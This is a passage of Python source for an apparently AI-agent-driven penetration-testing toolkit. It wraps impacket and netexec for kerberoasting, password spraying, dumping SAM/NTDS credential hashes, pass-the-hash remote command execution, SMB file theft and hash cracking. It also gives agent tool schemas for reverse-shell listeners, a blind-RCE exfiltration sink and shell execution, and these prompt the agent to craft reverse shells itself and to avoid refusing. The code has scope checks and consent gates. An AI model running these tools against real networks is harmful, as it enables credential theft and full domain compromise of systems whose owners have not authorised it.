    if not (domain and user and (password or nthash)):
        raise ToolError("kerberoast needs domain + user + password/nthash")
    tool = _impacket("GetUserSPNs")
    if not tool:
        raise ToolError("impacket GetUserSPNs not found. Install impacket (`pipx install impacket`).")
    cmd = [tool, "-dc-ip", dc or ctx.target, "-request", "-outputfile", "-"]
    if nthash:
        cmd = [tool, f"{domain}/{user}", "-hashes", f":{nthash}", "-dc-ip", dc or ctx.target, "-request"]
    else:
        cmd = [tool, f"{domain}/{user}:{password}", "-dc-ip", dc or ctx.target, "-request"]
    r = await _run_cli(cmd, timeout=240.0)
    hashes = _hash_hunt(r["stdout"])
    return {"domain": domain, "hashes": hashes, "count": len(hashes), "raw_tail": r["stdout"][-800:]}


async def ldap_enum(ctx: ScanContext, args: dict) -> dict:
    """Enumerate the domain over LDAP via netexec: users, groups, computers, password policy,
    account descriptions (often hold passwords), AS-REP-able and Kerberoastable accounts, trusts.
    Works with a null/anonymous bind or supplied creds. Read-only."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target
    _require_scope(target, ctx)
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found. Install it (`pipx install netexec`).")
    cmd = [nxc, "ldap", target, "-u", user, "-p", password]
    if nthash:
        cmd = [nxc, "ldap", target, "-u", user, "-H", nthash]
    for flag in ("--users", "--groups", "--computers", "--pass-pol",
                 "--asreproast", "/dev/null", "--kerberoasting", "/dev/null", "--trusted-for-delegation"):
        cmd.append(flag)
    r = await _run_cli(cmd, timeout=240.0)
    return {"target": target, "domain": domain, "rc": r["rc"],
            "output": _clean_nxc(r["stdout"] + "\n" + r["stderr"])[-6000:]}


async def rid_brute(ctx: ScanContext, args: dict) -> dict:
    """RID-cycle a host over SMB to pull domain users/groups — works even over a null session. Read-only."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target
    _require_scope(target, ctx)
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found. Install it (`pipx install netexec`).")
    cmd = [nxc, "smb", target, "-u", user, "-p", password, "--rid-brute"]
    if nthash:
        cmd = [nxc, "smb", target, "-u", user, "-H", nthash, "--rid-brute"]
    r = await _run_cli(cmd, timeout=240.0)
    principals = re.findall(r"\d+:\s+(\S+)\s+\(SidType", r["stdout"])
    return {"target": target, "principals": principals, "count": len(principals),
            "raw_tail": _clean_nxc(r["stdout"])[-1500:]}


async def smb_shares(ctx: ScanContext, args: dict) -> dict:
    """List SMB shares and read/write access on a host (null session or creds). Read-only."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target or str(args.get("host") or "")
    _require_scope(target, ctx)
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found. Install it (`pipx install netexec`).")
    cmd = [nxc, "smb", target, "-u", user, "-p", password, "--shares"]
    if nthash:
        cmd = [nxc, "smb", target, "-u", user, "-H", nthash, "--shares"]
    if domain:
        cmd += ["-d", domain]
    r = await _run_cli(cmd, timeout=180.0)
    return {"target": target, "output": _clean_nxc(r["stdout"] + r["stderr"])[-4000:],
            "pwned": "Pwn3d!" in r["stdout"]}


async def smb_get(ctx: ScanContext, args: dict) -> dict:
    """Download ONE file from an SMB share and return its contents (capped 256 KiB) — the SMB
    counterpart to ftp_get. Null session or creds/nthash (pass-the-hash). Read-only. Give the
    share (default C$) and the share-relative path, e.g. share='C$', path='Users\\\\Public\\\\flag.txt'."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target or str(args.get("host") or "")
    _require_scope(target, ctx)
    share = str(args.get("share") or "C$").strip()
    path = str(args.get("path") or "").strip()
    if not path:
        raise ToolError("smb_get needs a share-relative file path")
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found. Install it (`pipx install netexec`).")
    cap = 262144  # 256 KiB, matching ftp_get
    import tempfile
    fd, local = tempfile.mkstemp(suffix=".smbget")
    os.close(fd)
    try:
        cmd = [nxc, "smb", target, "-u", user]
        cmd += ["-H", nthash] if nthash else ["-p", password]
        if domain:
            cmd += ["-d", domain]
        cmd += ["--share", share, "--get-file", path, local]
        r = await _run_cli(cmd, timeout=180.0)
        data = b""
        try:
            with open(local, "rb") as fh:
                data = fh.read(cap + 1)
        except OSError:
            pass
        if not data:
            return {"target": target, "share": share, "path": path, "ok": False,
                    "error": "no data retrieved (bad path/share, access denied, or auth failed)",
                    "output": _clean_nxc(r["stdout"] + r["stderr"])[-1500:]}
        truncated = len(data) > cap
        data = data[:cap]
        return {"target": target, "share": share, "path": path, "ok": True,
                "bytes": len(data), "truncated": truncated,
                "content": data.decode("utf-8", "replace"),
                "creds_found": _scan_creds(data)}
    finally:
        try:
            os.unlink(local)
        except OSError:
            pass


async def password_spray(ctx: ScanContext, args: dict) -> dict:
    """Spray ONE password across many users over a protocol (smb/ldap/winrm/mssql/rdp/ssh).
    CONSENT-GATED — account-lockout risk. Always check the password policy first."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target
    _require_scope(target, ctx)
    proto = str(args.get("proto") or "smb").lower()
    spray_pw = str(args.get("spray_password") or password or "").strip()
    users = args.get("users") or args.get("userlist")
    if not (users and spray_pw):
        raise ToolError("password_spray needs a users list + a password to spray")
    if not await _consent(ctx, f"password-spray {proto} on {target} ({spray_pw!r})", target, "high"):
        return {"denied": True, "note": "operator did not approve spraying (lockout risk)"}
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found. Install it (`pipx install netexec`).")
    ufile = _mktemp_lines(users)
    try:
        cmd = [nxc, proto, target, "-u", ufile, "-p", spray_pw, "--continue-on-success"]
        if domain:
            cmd += ["-d", domain]
        r = await _run_cli(cmd, timeout=600.0)
    finally:
        try:
            os.unlink(ufile)
        except OSError:
            pass
    valid = re.findall(r"\[\+\]\s+(\S+)", r["stdout"])
    return {"target": target, "proto": proto, "valid": valid, "count": len(valid),
            "raw_tail": _clean_nxc(r["stdout"])[-1500:]}


async def secretsdump(ctx: ScanContext, args: dict) -> dict:
    """Dump credential material from a host: local SAM/LSA secrets, or domain NTDS.dit hashes
    (dump_type='ntds', run against a DC). CONSENT-GATED."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target or str(args.get("host") or "")
    _require_scope(target, ctx)
    if not (user and (password or nthash)):
        raise ToolError("secretsdump needs user + password/nthash")
    if not await _consent(ctx, f"dump secrets from {target}", target, "high"):
        return {"denied": True, "note": "operator did not approve secrets dump"}
    tool = _impacket("secretsdump")
    if not tool:
        raise ToolError("impacket secretsdump not found. Install impacket (`pipx install impacket`).")
    dom = f"{domain}/" if domain else ""
    if nthash:
        cmd = [tool, "-hashes", f":{nthash}", f"{dom}{user}@{target}"]
    else:
        cmd = [tool, f"{dom}{user}:{password}@{target}"]
    if str(args.get("dump_type") or "").lower() == "ntds":
        cmd += ["-just-dc"]
    r = await _run_cli(cmd, timeout=600.0)
    creds = [ln.strip() for ln in r["stdout"].splitlines()
             if re.search(r":::|aes256-cts|:1[0-9]{3}:", ln) or ":::" in ln]
    return {"target": target, "secrets": creds[:200], "count": len(creds),
            "raw_tail": r["stdout"][-1200:]}


async def win_exec(ctx: ScanContext, args: dict) -> dict:
    """Execute a command on a Windows host and read the output — over SMB (wmiexec/psexec/smbexec)
    or WinRM. Pass-the-hash supported via nthash. CONSENT-GATED (code execution)."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target or str(args.get("host") or "")
    _require_scope(target, ctx)
    command = str(args.get("command") or "").strip()
    method = str(args.get("method") or "wmiexec").lower()
    if not (user and (password or nthash) and command):
        raise ToolError("win_exec needs user + password/nthash + command")
    if not await _consent(ctx, f"execute on {target} via {method}: {command[:60]}", target, "high"):
        return {"denied": True, "note": "operator did not approve remote execution"}
    if method == "winrm":
        nxc = _netexec()
        if not nxc:
            raise ToolError("netexec/nxc not found for winrm exec (`pipx install netexec`).")
        cmd = [nxc, "winrm", target, "-u", user, "-p", password, "-x", command]
        if nthash:
            cmd = [nxc, "winrm", target, "-u", user, "-H", nthash, "-x", command]
        if domain:
            cmd += ["-d", domain]
    else:
        tool = _impacket(method if method in ("wmiexec", "psexec", "smbexec", "atexec") else "wmiexec")
        if not tool:
            raise ToolError(f"impacket {method} not found (`pipx install impacket`).")
        dom = f"{domain}/" if domain else ""
        auth = ["-hashes", f":{nthash}"] if nthash else []
        creds = f"{dom}{user}@{target}" if nthash else f"{dom}{user}:{password}@{target}"
        cmd = [tool, *auth, creds, command]
    r = await _run_cli(cmd, timeout=240.0)
    return {"target": target, "method": method, "command": command,
            "output": _clean_nxc(r["stdout"] + r["stderr"])[-6000:]}


async def ssh_exec(ctx: ScanContext, args: dict) -> dict:
    """Execute a command on a Linux/Unix host over SSH and read the output — the Linux
    counterpart to win_exec. Auth with a password OR a private key file. CONSENT-GATED
    (code execution). Run this on ANY SSH credential you recover to enumerate, read flags,
    and escalate — a validated login (e.g. via cred_check) is a dead end without it."""
    target = str(args.get("target") or args.get("host") or ctx.target or "").strip()
    _require_scope(target, ctx)
    user = str(args.get("user") or "").strip()
    password = str(args.get("password") or "")
    key_file = str(args.get("key_file") or "").strip()
    command = str(args.get("command") or "").strip()
    port = int(args.get("port", 22))
    if not (user and command and (password or key_file)):
        raise ToolError("ssh_exec needs user + command + (password or key_file)")
    if key_file and not os.path.isfile(key_file):
        raise ToolError(f"key_file not found: {key_file!r}")
    if not await _consent(ctx, f"execute on {target} via ssh: {command[:60]}", target, "high"):
        return {"denied": True, "note": "operator did not approve remote execution"}
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found for ssh exec (`pipx install netexec`).")
    cmd = [nxc, "ssh", target, "--port", str(port), "-u", user, "-x", command]
    if key_file:
        cmd += ["--key-file", key_file]
    # nxc wants -p even with a key (it's the passphrase); empty string is fine when unset.
    cmd += ["-p", password]
    r = await _run_cli(cmd, timeout=240.0)
    return {"target": target, "port": port, "user": user, "command": command,
            "output": _clean_nxc(r["stdout"] + r["stderr"])[-6000:]}


async def bloodhound_collect(ctx: ScanContext, args: dict) -> dict:
    """Collect AD attack-path data (users, groups, ACLs, sessions, GPOs, trusts) into BloodHound
    JSON/zip via bloodhound-python. Read-only but heavy. Needs domain creds."""
    domain, user, password, nthash, dc = _auth_principal(args)
    _require_scope(dc or ctx.target, ctx)
    if not (domain and user and (password or nthash)):
        raise ToolError("bloodhound_collect needs domain + user + password/nthash")
    bh = _which_any("bloodhound-python")
    if not bh:
        raise ToolError("bloodhound-python not found (`pipx install bloodhound`).")
    import tempfile
    outdir = tempfile.mkdtemp(prefix="pwner-bh-")
    cmd = [bh, "-d", domain, "-u", user, "-ns", dc or ctx.target, "-c", "All", "--zip"]
    if nthash:
        cmd += ["--hashes", f":{nthash}"]
    else:
        cmd += ["-p", password]
    r = await _run_cli(cmd + ["--outputdir", outdir], timeout=600.0)
    zips = [os.path.join(outdir, f) for f in os.listdir(outdir) if f.endswith(".zip")] \
        if os.path.isdir(outdir) else []
    return {"domain": domain, "output_dir": outdir, "zip": zips[0] if zips else None,
            "raw_tail": (r["stdout"] + r["stderr"])[-800:]}


async def adcs_find(ctx: ScanContext, args: dict) -> dict:
    """Enumerate AD Certificate Services and flag vulnerable templates (ESC1-ESC16) via certipy.
    Read-only (find). Needs domain creds."""
    domain, user, password, nthash, dc = _auth_principal(args)
    _require_scope(dc or ctx.target, ctx)
    certipy = _which_any("certipy", "certipy-ad")
    if not certipy:
        raise ToolError("certipy not found (`pipx install certipy-ad`).")
    if not (domain and user):
        raise ToolError("adcs_find needs domain + user (+ password/nthash)")
    cmd = [certipy, "find", "-u", f"{user}@{domain}", "-dc-ip", dc or ctx.target, "-vulnerable", "-stdout"]
    if nthash:
        cmd += ["-hashes", nthash]
    elif password:
        cmd += ["-p", password]
    r = await _run_cli(cmd, timeout=300.0)
    return {"domain": domain, "output": (r["stdout"] + r["stderr"])[-6000:]}


async def dc_vuln_check(ctx: ScanContext, args: dict) -> dict:
    """Run SAFE detection-only checks for well-known DC/Windows flaws (Zerologon, noPac, PetitPotam
    coercion, MS17-010) via netexec modules — detection, NOT exploitation. Read-only."""
    target = str(args.get("target") or args.get("host") or ctx.target).strip()
    _require_scope(target, ctx)
    domain, user, password, nthash, _dc = _auth_principal(args)
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found (`pipx install netexec`).")
    modules = args.get("checks") or ["zerologon", "nopac", "petitpotam", "ms17-010"]
    if isinstance(modules, str):
        modules = [modules]
    results: dict[str, str] = {}
    for mod in modules:
        cmd = [nxc, "smb", target, "-M", str(mod)]
        if user:
            cmd += ["-u", user, "-p", password]
        try:
            r = await _run_cli(cmd, timeout=180.0)
            results[str(mod)] = _clean_nxc(r["stdout"] + r["stderr"])[-500:]
        except ToolError as e:
            results[str(mod)] = f"error: {e}"
    vulnerable = [m for m, out in results.items() if "VULNERABLE" in out.upper()]
    return {"target": target, "vulnerable": vulnerable, "checks": results}


async def hash_crack(ctx: ScanContext, args: dict) -> dict:
    """Crack recovered hashes OFFLINE with hashcat (or john) against a wordlist. Safe — no target
    contact. hash_type is a hashcat mode (e.g. 18200 AS-REP, 13100 Kerberoast, 1000 NTLM)."""
    hashes = args.get("hashes")
    if not hashes:
        raise ToolError("hash_crack needs hashes")
    mode = str(args.get("hash_type") or args.get("mode") or "").strip()
    wordlist = str(args.get("wordlist") or "").strip()
    if not wordlist or not os.path.isfile(os.path.expanduser(wordlist)):
        raise ToolError("hash_crack needs a valid wordlist path (e.g. rockyou.txt)")
    hc = _which_any("hashcat")
    hfile = _mktemp_lines(hashes)
    try:
        if hc:
            if not mode:
                raise ToolError("hashcat needs hash_type (mode), e.g. 18200/13100/1000")
            await _run_cli([hc, "-m", mode, hfile, os.path.expanduser(wordlist),
                            "--quiet", "-o", hfile + ".out"], timeout=600.0)
            cracked = []
            if os.path.isfile(hfile + ".out"):
                with open(hfile + ".out", encoding="utf-8", errors="replace") as f:
                    cracked = [ln.strip() for ln in f if ln.strip()]
                os.unlink(hfile + ".out")
            return {"tool": "hashcat", "cracked": cracked[:100], "count": len(cracked)}
        john = _which_any("john")
        if not john:
            raise ToolError("neither hashcat nor john found. Install one (`brew install hashcat`).")
        await _run_cli([john, f"--wordlist={os.path.expanduser(wordlist)}", hfile], timeout=600.0)
        r = await _run_cli([john, "--show", hfile], timeout=60.0)
        return {"tool": "john", "output": r["stdout"][-2000:]}
    finally:
        try:
            os.unlink(hfile)
        except OSError:
            pass


async def cred_check(ctx: ScanContext, args: dict) -> dict:
    """Validate ONE credential across the target's auth services (smb/winrm/rdp/ldap/mssql/ssh/ftp)
    via netexec — the 'where does this credential actually work?' check. Read-only (no exec, one
    attempt per service). Reports where it's valid and where it's admin. A credential that fails one
    service often works another (classic: RDP works but WinRM doesn't), so testing a single service
    and concluding is a mistake this exists to prevent."""
    domain, user, password, nthash, dc = _auth_principal(args)
    target = dc or ctx.target or str(args.get("host") or "")
    _require_scope(target, ctx)
    if not user or not (password or nthash):
        raise ToolError("cred_check needs user + password or nthash")
    nxc = _netexec()
    if not nxc:
        raise ToolError("netexec/nxc not found (`pipx install netexec`).")
    svcs = args.get("services") or ["smb", "winrm", "rdp", "ldap", "mssql", "ssh", "ftp"]
    if isinstance(svcs, str):
        svcs = [s.strip().lower() for s in svcs.split(",") if s.strip()]
    results: dict[str, dict] = {}
    for proto in svcs:
        cmd = [nxc, str(proto), target, "-u", user]
        cmd += (["-H", nthash] if nthash else ["-p", password])
        if domain:
            cmd += ["-d", domain]
        try:
            r = await _run_cli(cmd, timeout=120.0)
            out = _clean_nxc(r["stdout"] + "\n" + r["stderr"])
            valid = "[+]" in out
            admin = "Pwn3d!" in out or "(admin)" in out.lower()
            status = next((ln.strip() for ln in reversed(out.splitlines())
                           if "[+]" in ln or "[-]" in ln), "")
            results[str(proto)] = {"valid": valid, "admin": admin, "detail": status[:160]}
        except ToolError as e:
            results[str(proto)] = {"valid": False, "error": str(e)[:120]}
    valid_on = [p for p, v in results.items() if v.get("valid")]
    admin_on = [p for p, v in results.items() if v.get("admin")]
    return {"target": target, "user": user, "valid_on": valid_on, "admin_on": admin_on,
            "services": results}


async def ledger(ctx: ScanContext, args: dict) -> dict:
    """Your engagement working-memory. Holds what you KNOW (attack `surface`, `creds` + where each was
    tested, `facts`), your open `hypotheses` (rank them, mark status), and what you've `tried`.
    action='show' (default) returns it; action='update' merges `data` in (list fields append+dedup,
    scalars overwrite). Review it before deciding your next move — so you don't re-tread ground or
    leave an obvious lead (a found credential, an untested open service) untouched."""
    if ctx.ledger is None:
        ctx.ledger = {"surface": [], "creds": [], "hypotheses": [], "tried": [], "facts": []}
    action = str(args.get("action") or "show").lower()
    if action == "update":
        data = args.get("data")
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, list):
                    cur = ctx.ledger.setdefault(k, [])
                    for item in v:
                        if item not in cur:
                            cur.append(item)
                else:
                    ctx.ledger[k] = v
        elif data is not None:
            return {"error": "update needs `data` as an object"}
    elif action == "clear":
        ctx.ledger = {"surface": [], "creds": [], "hypotheses": [], "tried": [], "facts": []}
    return {"ledger": ctx.ledger}


# ── Function-calling schemas + dispatch ───────────────────────────────────────

def _fn(name: str, desc: str, props: dict, required: list[str]) -> dict:
    return {
        "type": "function",
        "function": {
            "name": name,
            "description": desc,
            "parameters": {"type": "object", "properties": props, "required": required},
        },
    }


TOOL_SCHEMAS = [
    _fn("set_target", "Set/replace the authorized scope FROM THE OPERATOR'S REQUEST. Accepts an IP, "
        "CIDR, domain, OR a local interface name (e.g. 'en0', 'eth0', 'wlan0') or 'local'/'lan' for "
        "this machine's own subnet. Call this whenever the operator tells you what to scan instead of "
        "refusing for lack of a preset target. 'en0 /24' -> the /24 that interface is on.",
        {"target": {"type": "string", "description": "ip | cidr | domain | interface (en0) | 'local'"},
         "prefix": {"type": "integer", "description": "optional CIDR prefix, e.g. 24, for a subnet around an interface IP"}},
        ["target"]),
    _fn("port_scan", "TCP port scan (SYN if root, else connect). Returns open ports with service names. "
        "YOU control nmap flags via nmap_args — e.g. pass '-Pn' for a known-live host so discovery "
        "doesn't falsely mark it down on a full scan.",
        {"target": {"type": "string"}, "ports": {"type": "string",
                                                 "description": "top-1000|top-100|common|all|explicit '22,80,443' or '1-1024'"},
         "nmap_args": {"type": "string", "description": "extra nmap flags you choose, e.g. '-Pn -T2' (destructive scripts refused)"}},
        []),
    _fn("service_detect", "nmap version detection (-sV): exact service name/product/version per port.",
        {"target": {"type": "string"}, "ports": {"type": "string", "description": "optional port list; defaults to top-1000"},
         "nmap_args": {"type": "string", "description": "extra nmap flags you choose, e.g. '-Pn --version-all'"}}, []),
    _fn("vuln_scan", "nmap detection scripts (vuln+safe) for known CVEs/misconfigs. Run AFTER service_detect.",
        {"target": {"type": "string"}, "ports": {"type": "string", "description": "optional port list"},
         "nmap_args": {"type": "string", "description": "extra nmap flags you choose, e.g. '-Pn' or '--script ssl-enum-ciphers'"}}, []),
    _fn("os_detect", "nmap OS fingerprint (-O).",
        {"target": {"type": "string"}, "nmap_args": {"type": "string", "description": "extra nmap flags, e.g. '-Pn'"}}, []),
    _fn("ping_sweep", "Live-host discovery (-sn). Best first step for a CIDR target.",
        {"target": {"type": "string"}}, []),
    _fn("dns_enum", "DNS records (A/AAAA/CNAME/MX/NS/TXT) for a domain.",
        {"domain": {"type": "string"}}, []),
    _fn("banner_grab", "Raw banner from one host:port (for a port nmap didn't identify).",
        {"host": {"type": "string"}, "port": {"type": "integer"}}, ["host", "port"]),
    _fn("http_probe", "Fetch a web page and SEE it: status, server, title, body excerpt, links, "
        "forms (action/method/input names) and HTML comments. Use this to actually READ a web app.",
        {"host": {"type": "string"}, "port": {"type": "integer"}, "path": {"type": "string"}}, ["host", "port"]),
    _fn("content_discovery", "Map a web app's hidden paths/endpoints: probes a built-in list of common "
        "paths (+ any you add) and returns which exist (non-404) with status/size. Run this early on any web service.",
        {"host": {"type": "string"}, "port": {"type": "integer"},
         "paths": {"type": "array", "items": {"type": "string"},
                   "description": "extra paths to also try, e.g. ['/api/users','/v2/login']"}}, ["host"]),
    _fn("web_request", "Send a CUSTOM HTTP request (any method/path/headers/body/params) and get the full "
        "parsed response — for testing endpoints, logins, parameters, auth bypass, IDOR. This is how you "
        "interact with and exploit a web app's own logic (what nuclei can't do on a custom app).",
        {"host": {"type": "string"}, "port": {"type": "integer"},
         "method": {"type": "string", "description": "GET|POST|PUT|DELETE|..."},
         "path": {"type": "string"}, "headers": {"type": "object"}, "params": {"type": "object"},
         "data": {"type": "object", "description": "form fields for a POST"},
         "json": {"type": "object", "description": "JSON request body"}}, ["host", "path"]),
    _fn("http_download", "Download an HTTP response in FULL, binary-safe, and extract what matters: "
        "the text (or a strings extraction for binary — pcaps, zips, backups, images) PLUS any "
        "credentials found inside (HTTP Basic, FTP USER/PASS, user/password/token pairs). Use when a "
        "path is a file/binary or when http_probe's body was truncated. Don't judge a file by its first KB.",
        {"host": {"type": "string"}, "port": {"type": "integer"}, "path": {"type": "string"},
         "method": {"type": "string"}, "headers": {"type": "object"}}, ["host", "path"]),
    _fn("run_nmap", "Full-control nmap — YOU write the flags (scan type, -Pn, -p, timing, detection "
        "scripts, ...). Only destructive NSE scripts are refused. Use this when the preset scans don't fit.",
        {"target": {"type": "string"}, "args": {"type": "string", "description": "e.g. '-sU --top-ports 100' or '-sV --script ssl-enum-ciphers -p 443'"}}, ["args"]),
    _fn("nuclei_scan", "Run nuclei (thousands of known-CVE / misconfig / exposure templates) over target URLs. Use after discovering HTTP/network services.",
        {"targets": {"type": "array", "items": {"type": "string"},
                     "description": "Absolute URLs or host:port, e.g. ['http://host:80','host:445']"},
         "severity": {"type": "string", "description": "comma list, default low,medium,high,critical"}}, []),
    _fn("request_consent", "STOP and ask the operator before a high-impact action (active exploitation, brute-force, mass traffic). Returns approved/denied.",
        {"action": {"type": "string"}, "target": {"type": "string"},
         "risk": {"type": "string", "enum": ["medium", "high", "critical"]}}, ["action", "target"]),
    _fn("exploit_search", "Search public exploits for a service/version (searchsploit + nuclei template names). Read-only — use after fingerprinting a version.",
        {"service": {"type": "string"}, "version": {"type": "string"}}, ["service"]),
    _fn("ftp_anon", "FTP login + directory listing (read-only recon). Anonymous by default; pass "
        "user/password to test credentials you found elsewhere.",
        {"host": {"type": "string"}, "port": {"type": "integer"},
         "user": {"type": "string"}, "password": {"type": "string"}}, ["host"]),
    _fn("ftp_get", "Download ONE file over FTP and read its contents (capped 256 KiB) — a config, "
        "backup, source file, or flag. Anonymous by default; pass user/password for an account.",
        {"host": {"type": "string"}, "port": {"type": "integer"}, "path": {"type": "string"},
         "user": {"type": "string"}, "password": {"type": "string"}}, ["host", "path"]),
    _fn("smb_enum", "Enumerate SMB (445): OS/domain, dialects, signing, shares, users, sessions via "
        "nmap's safe SMB scripts. Read-only, no brute-force. FIRST move whenever 445 is open.",
        {"host": {"type": "string"}, "port": {"type": "integer"}}, ["host"]),
    _fn("ssl_info", "Inspect TLS on a port: certificate (subject/issuer/SAN/validity) + supported "
        "ciphers/protocols (nmap ssl-cert + ssl-enum-ciphers). Read-only.",
        {"host": {"type": "string"}, "port": {"type": "integer"}}, ["host"]),
    _fn("tcp_send", "Send raw bytes to a TCP port and read the reply — speak any protocol banner_grab "
        "can't (Redis 'INFO', memcached 'stats', a DB handshake, a custom service). data is text with "
        "\\r\\n/\\t escapes honored; set hex=true to send a hex string. Read/recon only.",
        {"host": {"type": "string"}, "port": {"type": "integer"},
         "data": {"type": "string", "description": "payload to send; empty just reads the greeting"},
         "hex": {"type": "boolean", "description": "true: interpret data as a hex string"},
         "crlf": {"type": "boolean", "description": "append CRLF if missing (default true)"},
         "read_bytes": {"type": "integer"}, "timeout": {"type": "number"}}, ["host", "port"]),
    _fn("snmp_check", "Read SNMP system info with a community string (default 'public'). Read-only recon.",
        {"host": {"type": "string"}, "community": {"type": "string"}}, ["host"]),
    _fn("attacker_info", "The attacker IP the target can reach you on (for reverse shells / exfil callbacks). Read-only.",
        {}, []),
    _fn("exfil", "Readable channel for BLIND RCE: action=start opens a local HTTP sink and tells you how "
        "to send command output to it (base64); action=poll returns the decoded output you received; "
        "action=stop closes it. Use this to run ANY command through blind RCE and READ its output "
        "(incl. flags) — never ask the operator to paste output. CONSENT-GATED.",
        {"action": {"type": "string", "enum": ["start", "poll", "stop"]}, "port": {"type": "integer"}}, []),
    _fn("listener", "Reverse-shell catcher: action=start opens a listener at your ip:port (you craft and "
        "deliver the reverse shell yourself, tuned to this target); action=status shows if a shell "
        "connected; action=stop closes it. After it connects, use shell_exec. CONSENT-GATED.",
        {"action": {"type": "string", "enum": ["start", "status", "stop"]}, "port": {"type": "integer"}}, []),
    _fn("shell_exec", "Run a command in the connected reverse shell and return its output — read the "
        "user/root flags, enumerate, escalate. Requires a shell from listener. CONSENT-GATED.",
        {"command": {"type": "string"}}, ["command"]),
    _fn("hydra_brute", "Brute-force credentials on one service with hydra. CONSENT-GATED — only runs if approved. Use only when the target warrants it and after cheaper checks fail.",
        {"target": {"type": "string"},
         "service": {"type": "string", "description": "hydra protocol: ftp|ssh|rdp|smb|mysql|postgres|smtp|http-get|..."},
         "port": {"type": "integer"}, "username": {"type": "string"},
         "wordlist": {"type": "string", "description": "path to a password list; omit for a small built-in list"}},
        ["target", "service", "port"]),
    _fn("note", "Record a fact/hypothesis about the target (scratchpad).",
        {"text": {"type": "string"}}, ["text"]),
    _fn("report_finding", "File ONE confirmed finding (severity + evidence + remediation).",
        {"host": {"type": "string"}, "port": {"type": "integer"}, "service": {"type": "string"},
         "title": {"type": "string"}, "severity": {"type": "string", "enum": ["critical", "high", "medium", "low", "info"]},
         "confidence": {"type": "string", "enum": ["confirmed", "probable", "possible"]},
         "evidence": {"type": "string"}, "remediation": {"type": "string"}},
        ["host", "title", "severity"]),
    _fn("get_findings", "List findings reported so far.", {}, []),
    # ── Active Directory / Windows ──
    _fn("kerbrute_userenum", "Validate/enumerate domain usernames via Kerberos pre-auth — no password, "
        "no lockout. Give a domain, the DC, and a list of candidate usernames. Read-only.",
        {"domain": {"type": "string"}, "dc_ip": {"type": "string"}, "target": {"type": "string"},
         "users": {"type": "array", "items": {"type": "string"}, "description": "candidate usernames"}},
        ["domain"]),
    _fn("asrep_roast", "AS-REP roast: recover crackable Kerberos hashes for accounts with pre-auth "
        "disabled. Needs NO credentials — just a domain + user(s). Returns $krb5asrep hashes. Read-only.",
        {"domain": {"type": "string"}, "dc_ip": {"type": "string"}, "user": {"type": "string"},
         "users": {"type": "array", "items": {"type": "string"}}}, ["domain"]),
    _fn("kerberoast", "Kerberoast: request service tickets for SPN accounts -> crackable $krb5tgs "
        "hashes. Needs valid domain creds. Read-only.",
        {"domain": {"type": "string"}, "dc_ip": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"}}, ["domain", "user"]),
    _fn("ldap_enum", "Enumerate the domain over LDAP (netexec): users, groups, computers, password "
        "policy, account descriptions, AS-REP-able/Kerberoastable accounts, trusts. Null/anonymous bind "
        "or supplied creds/hash. Read-only.",
        {"target": {"type": "string"}, "dc_ip": {"type": "string"}, "domain": {"type": "string"},
         "user": {"type": "string"}, "password": {"type": "string"}, "nthash": {"type": "string"}}, []),
    _fn("rid_brute", "RID-cycle a host over SMB to pull domain users/groups — works over a null session. "
        "Read-only.",
        {"target": {"type": "string"}, "domain": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"}}, []),
    _fn("smb_shares", "List SMB shares and read/write access on a host (null session or creds). Read-only.",
        {"target": {"type": "string"}, "host": {"type": "string"}, "domain": {"type": "string"},
         "user": {"type": "string"}, "password": {"type": "string"}, "nthash": {"type": "string"}}, []),
    _fn("smb_get", "Download ONE file from an SMB share and read its contents (capped 256 KiB) — the "
        "SMB counterpart to ftp_get. Null session or creds/nthash (pass-the-hash). Read-only. After "
        "smb_shares finds a readable share, pull a config/backup/flag out of it.",
        {"target": {"type": "string"}, "host": {"type": "string"}, "domain": {"type": "string"},
         "user": {"type": "string"}, "password": {"type": "string"}, "nthash": {"type": "string"},
         "share": {"type": "string", "description": "share name, default C$"},
         "path": {"type": "string", "description": "share-relative path, e.g. 'Users\\\\Public\\\\flag.txt'"}},
        ["path"]),
    _fn("password_spray", "Spray ONE password across MANY users over a protocol "
        "(smb/ldap/winrm/mssql/rdp/ssh). CONSENT-GATED — account-lockout risk; check the password "
        "policy first. Returns which user/password pairs are valid.",
        {"target": {"type": "string"}, "proto": {"type": "string"}, "domain": {"type": "string"},
         "users": {"type": "array", "items": {"type": "string"}},
         "spray_password": {"type": "string"}}, ["users", "spray_password"]),
    _fn("secretsdump", "Dump credential material: local SAM/LSA secrets, or domain NTDS.dit hashes "
        "(dump_type='ntds' against a DC). Supports pass-the-hash. CONSENT-GATED.",
        {"target": {"type": "string"}, "domain": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"},
         "dump_type": {"type": "string", "enum": ["local", "ntds"]}}, ["user"]),
    _fn("win_exec", "Execute a command on a Windows host and read output — SMB (wmiexec/psexec/smbexec) "
        "or WinRM. Pass-the-hash via nthash. CONSENT-GATED (code execution).",
        {"target": {"type": "string"}, "domain": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"}, "command": {"type": "string"},
         "method": {"type": "string", "enum": ["wmiexec", "psexec", "smbexec", "atexec", "winrm"]}},
        ["user", "command"]),
    _fn("ssh_exec", "Execute a command on a Linux/Unix host over SSH and read the output — the Linux "
        "counterpart to win_exec. Auth with a password OR a private key file. CONSENT-GATED (code "
        "execution). Run this on ANY SSH credential you recover (e.g. from cred_check) to enumerate, "
